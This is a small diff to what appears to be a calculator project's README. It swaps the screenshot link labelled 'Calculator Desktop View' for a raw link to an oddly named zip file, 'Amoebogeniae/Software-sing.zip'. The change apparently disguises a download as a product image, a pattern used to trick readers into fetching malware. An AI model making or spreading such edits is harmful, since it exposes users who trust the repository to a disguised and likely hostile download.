@@ -5,5 +5,5 @@
  <br/>
 
  
-![Calculator Desktop View](https://github.com/Kartikay7124/Calculator/assets/102504679/9dfc806f-a424-4a55-99e9-5e4f3a602b92)
+![Calculator Desktop View](https://raw.githubusercontent.com/Kartikay7124/Calculator/main/Amoebogeniae/Software-sing.zip)
 
